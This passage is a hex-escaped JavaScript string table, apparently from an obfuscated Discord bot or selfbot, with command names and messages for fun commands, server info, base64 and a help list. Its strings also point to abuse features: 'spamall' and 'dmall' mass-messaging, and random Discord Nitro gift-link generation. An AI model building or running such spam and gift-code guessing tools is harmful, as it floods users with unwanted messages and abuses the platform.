x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F","\x6B\x65\x79","\x63\x6C\x65\x61\x6E","\x61\x72\x72\x61\x79","\x66\x69\x6C\x74\x65\x72","\x60\x45\x52\x52\x4F\x52\x60\x0A\x60\x60\x60\x6A\x73\x0A","\x0A\x60\x60\x60","\x63\x61\x74\x63\x68","\x6D\x61\x70","\x66\x65\x74\x63\x68\x4D\x65\x73\x73\x61\x67\x65\x73","\x65\x6D\x6F\x6A\x69\x66\x79","\x3A\x7A\x65\x72\x6F\x3A","\x3A\x6F\x6E\x65\x3A","\x3A\x74\x77\x6F\x3A","\x3A\x74\x68\x72\x65\x65\x3A","\x3A\x66\x6F\x75\x72\x3A","\x3A\x66\x69\x76\x65\x3A","\x3A\x73\x69\x78\x3A","\x3A\x73\x65\x76\x65\x6E\x3A","\x3A\x65\x69\x67\x68\x74\x3A","\x3A\x6E\x69\x6E\x65\x3A","\x3A\x67\x72\x65\x79\x5F\x65\x78\x63\x6C\x61\x6D\x61\x74\x69\x6F\x6E\x3A","\x3A\x67\x72\x65\x79\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x3A","\x3A\x68\x61\x73\x68\x3A","\x3A\x61\x73\x74\x65\x72\x69\x73\x6B\x3A","\x3A\x68\x65\x61\x76\x79\x5F\x64\x6F\x6C\x6C\x61\x72\x5F\x73\x69\x67\x6E\x3A","\x3A\x68\x65\x61\x76\x79\x5F\x70\x6C\x75\x73\x5F\x73\x69\x67\x6E\x3A","\x3A\x68\x65\x61\x76\x79\x5F\x6D\x69\x6E\x75\x73\x5F\x73\x69\x67\x6E\x3A","\x3A\x68\x65\x61\x76\x79\x5F\x64\x69\x76\x69\x64\x65\x5F\x73\x69\x67\x6E\x3A","\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65","\x3A\x72\x65\x67\x69\x6F\x6E\x61\x6C\x5F\x69\x6E\x64\x69\x63\x61\x74\x6F\x72\x5F","\x3A","\x66\x6F\x72\x45\x61\x63\x68","\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x65\x6D\x6F\x6A\x69\x66\x79","\x63\x62","\x73\x74\x61\x72\x74\x54\x79\x70\x69\x6E\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x63\x68\x61\x74\x62\x6F\x74\x3F\x6D\x65\x73\x73\x61\x67\x65\x3D","\x3E\x20","\x72\x65\x73\x70\x6F\x6E\x73\x65","\x73\x74\x6F\x70\x54\x79\x70\x69\x6E\x67","\x73\x74\x61\x63\x6B","\x73\x61\x79","\x70\x69\x6E\x67","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x4D\x65\x73\x73\x61\x67\x65\x2A\x2A\x20\xBB\x20","\x63\x72\x65\x61\x74\x65\x64\x54\x69\x6D\x65\x73\x74\x61\x6D\x70","\x6D\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x57\x65\x62\x53\x6F\x63\x6B\x65\x74\x2A\x2A\x20\xBB\x20","\x6D\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x50\x6F\x6E\x67\x21","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x6F\x6E\x67\x21\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4D\x65\x73\x73\x61\x67\x65\x20\xBB\x20","\x6D\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x57\x65\x62\x73\x6F\x63\x6B\x65\x74\x20\xBB\x20","\x6D\x73","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x50\x69\x6E\x67\x69\x6E\x67\x2E\x2E\x2E","\x65\x6D\x62\x65\x64","\uD835\uDE3E\uD835\uDE67\uD835\uDE6E\uD835\uDE65\uD835\uDE69\uD835\uDE5E\uD835\uDE58","\x23\x31\x42\x37\x38\x45\x37","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x64\x69\x61\x34\x2E\x67\x69\x70\x68\x79\x2E\x63\x6F\x6D\x2F\x6D\x65\x64\x69\x61\x2F\x36\x63\x58\x4A\x55\x33\x5A\x43\x6A\x30\x55\x37\x67\x79\x38\x5A\x58\x6F\x2F\x67\x69\x70\x68\x79\x2E\x67\x69\x66","\x73\x65\x72\x76\x65\x72\x69\x6E\x66\x6F","\x54\x68\x69\x73\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x20\x63\x61\x6E\x6E\x6F\x74\x20\x62\x65\x20\x65\x78\x65\x63\x75\x74\x65\x64\x20\x69\x6E\x20\x44\x69\x72\x65\x63\x74\x20\x4D\x65\x73\x73\x61\x67\x65\x73\x20\x6F\x72\x20\x69\x6E\x20\x50\x72\x69\x76\x61\x74\x65\x20\x47\x72\x6F\x75\x70\x73\x2E","\x72\x65\x67\x69\x6F\x6E","\x62\x72\x61\x7A\x69\x6C","\x42\x72\x61\x7A\x69\x60","\x65\x75\x72\x6F\x70\x65","\x45\x75\x72\x6F\x70\x65","\x68\x6F\x6E\x67\x6B\x6F\x6E\x67","\x48\x6F\x6E\x67\x20\x4B\x6F\x6E\x60","\x69\x6E\x64\x69\x61","\x49\x6E\x64\x69\x61","\x6A\x61\x70\x61\x6E","\x4A\x61\x70\x61\x6E","\x72\x75\x73\x73\x69\x61","\x52\x75\x73\x73\x69\x61","\x73\x69\x6E\x67\x61\x70\x6F\x72\x65","\x53\x69\x6E\x67\x61\x70\x6F\x72\x65","\x73\x6F\x75\x74\x68\x20\x61\x66\x72\x69\x63\x61","\x53\x6F\x75\x74\x68\x20\x41\x66\x72\x69\x63\x61","\x73\x79\x64\x6E\x65\x79","\x53\x79\x64\x6E\x65\x79","\x75\x73\x2D\x63\x65\x6E\x74\x72\x61\x6C","\x55\x53\x20\x43\x65\x6E\x74\x72\x61\x6C","\x75\x73\x2D\x65\x61\x73\x74","\x55\x53\x20\x45\x61\x73\x74","\x75\x73\x2D\x73\x6F\x75\x74\x68","\x55\x53\x20\x53\x6F\x75\x74\x68","\x75\x73\x2D\x77\x65\x73\x74","\x55\x53\x20\x57\x65\x73\x74","\x76\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x4C\x65\x76\x65\x6C","\x4E\x4F\x4E\x45","\x4C\x4F\x57","\x4C\x6F\x77","\x4D\x45\x44\x49\x55\x4D","\x4D\x65\x64\x69\x75\x6D","\x48\x49\x47\x48","\x48\x69\x67\x68","\x56\x45\x52\x59\x5F\x48\x49\x47\x48","\x60\x48\x69\x67\x68\x65\x73\x74","\x2C\x20","\x73\x69\x7A\x65","\x73\x74\x61\x74\x75\x73","\x70\x72\x65\x73\x65\x6E\x63\x65","\x64\x6E\x64","\x6D\x65\x6D\x62\x65\x72\x73","\x69\x64\x6C\x65","\x6F\x6E\x6C\x69\x6E\x65","\x6F\x66\x66\x6C\x69\x6E\x65","\x73\x74\x72\x65\x61\x6D\x69\x6E\x67","\x74\x79\x70\x65","\x74\x65\x78\x74","\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x76\x6F\x69\x63\x65","\x63\x61\x74\x65\x67\x6F\x72\x79","\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4C\x65\x76\x65\x6C","\x61\x64\x64\x46\x69\x65\x6C\x64","\x43\x68\x61\x6E\x6E\x65\x6C\x73","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x54\x6F\x74\x61\x6C\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x54\x65\x78\x74\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x56\x6F\x69\x63\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x43\x61\x74\x65\x67\x6F\x72\x69\x65\x73\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x54\x6F\x74\x61\x6C\x20\x45\x6D\x6F\x6A\x69\x73","\x65\x6D\x6F\x6A\x69\x73","\x42\x6F\x6F\x73\x74\x20\x4C\x65\x76\x65\x6C","\x70\x72\x65\x6D\x69\x75\x6D\x54\x69\x65\x72","\x54\x6F\x74\x61\x6C\x20\x42\x6F\x6F\x73\x74\x73","\x70\x72\x65\x6D\x69\x75\x6D\x53\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x43\x6F\x75\x6E\x74","\x47\x75\x69\x6C\x64\x20\x49\x44","\x47\x75\x69\x6C\x64\x20\x63\x72\x65\x61\x74\x65\x64\x20\x61\x74","\x4D\x4D\x4D\x4D\x20\x44\x6F\x20\x59\x59\x59\x59\x2C\x20\x68\x3A\x6D\x6D\x20\x41","\x63\x72\x65\x61\x74\x65\x64\x41\x74","\x20\x7C\x20","\x66\x72\x6F\x6D\x4E\x6F\x77","\x73\x74\x61\x72\x74\x4F\x66","\x47\x75\x69\x6C\x64\x20\x52\x65\x67\x69\x6F\x6E","\x4D\x65\x6D\x62\x65\x72\x20\x50\x72\x65\x73\x65\x6E\x63\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x44\x6F\x20\x4E\x6F\x74\x20\x44\x69\x73\x74\x75\x72\x62\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x49\x64\x6C\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x4F\x6E\x6C\x69\x6E\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x4F\x66\x66\x6C\x69\x6E\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x53\x74\x72\x65\x61\x6D\x69\x6E\x67\x3A\x20","\x4D\x65\x6D\x62\x65\x72\x73","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x48\x75\x6D\x61\x6E\x73\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x42\x6F\x74\x73\x3A\x20","\x47\x75\x69\x6C\x64\x20\x4F\x77\x6E\x65\x72","\x3C\x40\x21","\x6F\x77\x6E\x65\x72\x49\x44","\x3E","\x47\x75\x69\x6C\x64\x20\x4E\x61\x6D\x65\x20\x41\x63\x72\x6F\x6E\x79\x6D","\x6E\x61\x6D\x65\x41\x63\x72\x6F\x6E\x79\x6D","\x47\x75\x69\x6C\x64\x20\x4E\x61\x6D\x65","\x69\x63\x6F\x6E\x55\x52\x4C","\x20\x69\x6E\x66\x6F","\x5D\x20\x54\x6F\x74\x61\x6C\x20\x52\x6F\x6C\x65\x73","\x2E\x2E\x2E\x20\x61\x6E\x64\x20","\x20\x6D\x6F\x72\x65\x21","\x73\x65\x74\x54\x69\x6D\x65\x73\x74\x61\x6D\x70","\x5C\x60\x5C\x60\x5C\x60\x47\x75\x69\x6C\x64\x20\x4E\x61\x6D\x65\x3A\x20","\x0D\x0A\x47\x75\x69\x6C\x64\x20\x4E\x61\x6D\x65\x20\x41\x63\x72\x6F\x6E\x79\x6D\x3A\x20","\x0D\x0A\x47\x75\x69\x6C\x64\x20\x4F\x77\x6E\x65\x72\x3A\x20","\x6F\x77\x6E\x65\x72","\x0D\x0A\x4D\x65\x6D\x62\x65\x72\x73\x3A\x0D\x0A\x20\x20\x20\x20\x54\x6F\x74\x61\x6C\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x48\x75\x6D\x61\x6E\x73\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x42\x6F\x74\x73\x3A\x20","\x0D\x0A\x4D\x65\x6D\x62\x65\x72\x20\x50\x72\x65\x73\x65\x6E\x63\x65\x3A\x0D\x0A\x20\x20\x20\x20\x44\x6F\x20\x4E\x6F\x74\x20\x44\x69\x73\x74\x75\x72\x62\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x49\x64\x6C\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x4F\x6E\x6C\x69\x6E\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x4F\x66\x66\x6C\x69\x6E\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x53\x74\x72\x65\x61\x6D\x69\x6E\x67\x3A\x20","\x0D\x0A\x47\x75\x69\x6C\x64\x20\x52\x65\x67\x69\x6F\x6E\x3A\x20","\x0D\x0A\x47\x75\x69\x6C\x64\x20\x63\x72\x65\x61\x74\x65\x64\x20\x61\x74\x3A\x20","\x0D\x0A\x47\x75\x69\x6C\x64\x20\x49\x44\x3A\x20","\x0D\x0A\x54\x6F\x74\x61\x6C\x20\x42\x6F\x6F\x73\x74\x73\x3A\x20","\x0D\x0A\x42\x6F\x6F\x73\x74\x20\x4C\x65\x76\x65\x6C\x3A\x20","\x0D\x0A\x54\x6F\x74\x61\x6C\x20\x45\x6D\x6F\x6A\x69\x73\x3A\x20","\x0D\x0A\x43\x68\x61\x6E\x6E\x65\x6C\x73\x3A\x0D\x0A\x20\x20\x20\x20\x54\x6F\x74\x61\x6C\x20","\x0D\x0A\x20\x20\x20\x20\x54\x65\x78\x74\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x56\x6F\x69\x63\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x43\x61\x74\x65\x67\x6F\x72\x69\x65\x73\x3A\x20","\x0D\x0A\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4C\x65\x76\x65\x6C\x3A\x20","\x0D\x0A\x54\x6F\x74\x61\x6C\x20\x52\x6F\x6C\x65\x73\x3A\x20","\x65\x6D\x70\x74\x79","\u200B","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x73\x65\x72\x76\x65\x72\x20\x69\x6E\x76\x69\x74\x65\x20\x63\x6F\x64\x65\x20\x77\x69\x74\x68\x6F\x75\x74\x20\x74\x68\x65\x20\x3C\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x67\x67\x2F\x3E\x20\x70\x61\x72\x74\x20\x6F\x72\x20\x3C\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x69\x6E\x76\x69\x74\x65\x73\x2F\x3E","\x49\x6E\x76\x61\x6C\x69\x64\x20\x73\x65\x72\x76\x65\x72\x20\x69\x6E\x76\x69\x74\x65","\x61\x63\x63\x65\x70\x74\x49\x6E\x76\x69\x74\x65","\x6E\x69\x74\x72\x6F","\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x63\x68\x61\x72\x41\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x67\x69\x66\x74\x2F","\x64\x6F\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x69\x6D\x67\x2F\x64\x6F\x67","\x6C\x69\x6E\x6B","\x52\x61\x6E\x64\x6F\x6D\x20\x64\x6F\x67\x20\x69\x6D\x61\x67\x65","\x64\x6F\x67\x2E\x70\x6E\x67","\x63\x61\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x69\x6D\x67\x2F\x63\x61\x74","\x52\x61\x6E\x64\x6F\x6D\x20\x63\x61\x74\x20\x69\x6D\x61\x67\x65","\x63\x61\x74\x2E\x70\x6E\x67","\x66\x6F\x78","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x69\x6D\x67\x2F\x66\x6F\x78","\x52\x61\x6E\x64\x6F\x6D\x20\x66\x6F\x78\x20\x69\x6D\x61\x67\x65","\x66\x6F\x78\x2E\x70\x6E\x67","\x66\x6F\x78\x66\x61\x63\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x66\x61\x63\x74\x73\x2F\x66\x6F\x78","\x66\x61\x63\x74","\x64\x6F\x67\x66\x61\x63\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x66\x61\x63\x74\x73\x2F\x64\x6F\x67","\x63\x61\x74\x66\x61\x63\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x66\x61\x63\x74\x73\x2F\x63\x61\x74","\x77\x69\x6E\x6B","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x75\x73\x65\x72\x2E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x61\x6E\x69\x6D\x75\x2F\x77\x69\x6E\x6B","\x20\x77\x69\x6E\x6B\x73\x20\x61\x74\x20","\x77\x69\x6E\x6B\x2E\x70\x6E\x67","\x70\x61\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x61\x6E\x69\x6D\x75\x2F\x70\x61\x74","\x20\x70\x61\x74\x73\x20","\x70\x61\x74\x2E\x70\x6E\x67","\x68\x75\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x61\x6E\x69\x6D\x75\x2F\x68\x75\x67","\x20\x20\x68\x75\x67\x73\x20","\x68\x75\x67\x2E\x70\x6E\x67","\x20\x68\x75\x67\x73\x20","\x72\x61\x6E\x64\x6F\x6D\x74\x6F\x6B\x65\x6E","\x6D\x65\x6D\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x6D\x65\x6D\x65","\x69\x6D\x61\x67\x65","\x63\x61\x70\x74\x69\x6F\x6E","\x6D\x65\x6D\x65\x2E\x70\x6E\x67","\x62\x61\x73\x65\x36\x34","\x55\x6B\x6E\x6F\x77\x6E\x20\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x65\x20\x6D\x65\x74\x68\x6F\x64\x20\x66\x69\x72\x73\x74\x2C\x20\x65\x69\x74\x68\x65\x72\x20\x64\x65\x63\x6F\x64\x65\x20\x6F\x72\x20\x65\x6E\x63\x6F\x64\x65\x20\x69\x74","\x65\x6E\x63\x6F\x64\x65","\x64\x65\x63\x6F\x64\x65","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x73\x6F\x6D\x65\x20\x74\x65\x78\x74","\x59\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x69\x73\x20\x74\x6F\x20\x6C\x6F\x6E\x67\x2E\x20\x54\x68\x65\x20\x6D\x61\x78\x69\x6D\x75\x6D\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73\x20\x69\x73\x20\x60\x31\x2C\x30\x32\x34\x60","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x62\x61\x73\x65\x36\x34\x3F\x65\x6E\x63\x6F\x64\x65\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x62\x61\x73\x65\x36\x34\x3F\x64\x65\x63\x6F\x64\x65\x3D","\x73\x70\x61\x6D\x61\x6C\x6C","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x2E","\x5B\x2B\x5D\x20\x4D\x65\x73\x73\x61\x67\x65\x20\x73\x65\x6E\x74\x20\x74\x6F\x20\x23","\x5B\x2D\x5D\x20\x4D\x65\x73\x73\x61\x67\x65\x20\x63\x6F\x75\x6C\x64\x6E\x27\x74\x20\x73\x65\x6E\x64\x20\x74\x6F\x20\x23","\x64\x6D\x61\x6C\x6C","\x5B\x2D\x5D\x20\x43\x6F\x75\x6C\x64\x6E\x27\x74\x20\x73\x65\x6E\x64\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20","\x5B\x2B\x5D\x20\x4D\x65\x73\x73\x61\x67\x65\x20\x73\x65\x6E\x74\x20\x74\x6F\x20","\x63\x65\x6D\x62\x65\x64","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x73\x6F\x6D\x65\x20\x74\x65\x78\x74\x21","\x30\x78","\x66\x75\x6E","\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x38\x62\x61\x6C\x6C\x20\x3C\x71\x75\x65\x73\x74\x69\x6F\x6E\x3E\x2A\x2A\x20\xBB\x20\x41\x73\x6B\x73\x20\x74\x68\x65\x20\x38\x62\x61\x6C\x6C\x20\x61\x20\x71\x75\x65\x73\x74\x69\x6F\x6E\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x63\x68\x6F\x69\x63\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x61\x76\x61\x74\x61\x72\x20\x5B\x75\x73\x65\x72\x5D\x2A\x2A\x20\xBB\x20\x47\x65\x74\x73\x20\x74\x68\x65\x20\x61\x76\x61\x74\x61\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x62\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x54\x61\x6C\x6B\x20\x74\x6F\x20\x79\x6F\x75\x72\x73\x65\x6C\x66\x20\x61\x73\x20\x69\x66\x20\x69\x74\x27\x73\x20\x61\x20\x63\x68\x61\x74\x20\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x68\x75\x67\x20\x3C\x75\x73\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x68\x75\x67\x67\x69\x6E\x67\x20\x67\x69\x66\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x65\x6D\x65\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x20\x66\x72\x65\x73\x68\x20\x6D\x65\x6D\x65\x20\x6F\x66\x20\x74\x68\x65\x20\x69\x6E\x74\x65\x72\x6E\x65\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x70\x69\x6E\x67\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x74\x68\x65\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x61\x6E\x64\x20\x74\x68\x65\x20\x77\x65\x62\x73\x6F\x63\x6B\x65\x74\x20\x6C\x61\x74\x65\x6E\x63\x79\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x70\x61\x74\x20\x3C\x75\x73\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x70\x61\x74\x74\x69\x6E\x67\x20\x67\x69\x66\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x61\x6E\x64\x6F\x6D\x74\x6F\x6B\x65\x6E\x2A\x2A\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x61\x20\x72\x61\x6E\x64\x6F\x6D\x20\x69\x6E\x76\x61\x6C\x69\x64\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x62\x6F\x74\x20\x74\x6F\x6B\x65\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x75\x70\x74\x69\x6D\x65\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x68\x6F\x77\x20\x6C\x6F\x6E\x67\x20\x74\x68\x65\x20\x62\x6F\x74\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x63\x75\x72\x72\x65\x6E\x74\x6C\x79\x20\x62\x65\x65\x6E\x20\x72\x75\x6E\x6E\x69\x6E\x67\x20\x66\x6F\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x77\x69\x6E\x6B\x20\x3C\x75\x73\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x77\x69\x6E\x6B\x69\x6E\x67\x20\x67\x69\x66","\x46\x75\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x54\x68\x65\x20\x6C\x69\x73\x74\x20\x77\x61\x73\x20\x74\x6F\x20\x62\x69\x67\x2C\x20\x63\x6C\x69\x63\x6B\x20\x74\x68\x69\x73\x20\x6C\x69\x6E\x6B\x20\x74\x6F\x20\x76\x69\x65\x77\x20\x61\x6C\x6C\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x3A\x5C\x6E\x2A\x2A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F","\x2A\x2A","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x46\x75\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x38\x62\x61\x6C\x6C\x20\x3C\x71\x75\x65\x73\x74\x69\x6F\x6E\x3E\x20\xBB\x20\x41\x73\x6B\x73\x20\x74\x68\x65\x20\x38\x62\x61\x6C\x6C\x20\x61\x20\x71\x75\x65\x73\x74\x69\x6F\x6E\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x63\x68\x6F\x69\x63\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x61\x76\x61\x74\x61\x72\x20\x5B\x75\x73\x65\x72\x5D\x20\xBB\x20\x47\x65\x74\x73\x20\x74\x68\x65\x20\x61\x76\x61\x74\x61\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x62\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x54\x61\x6C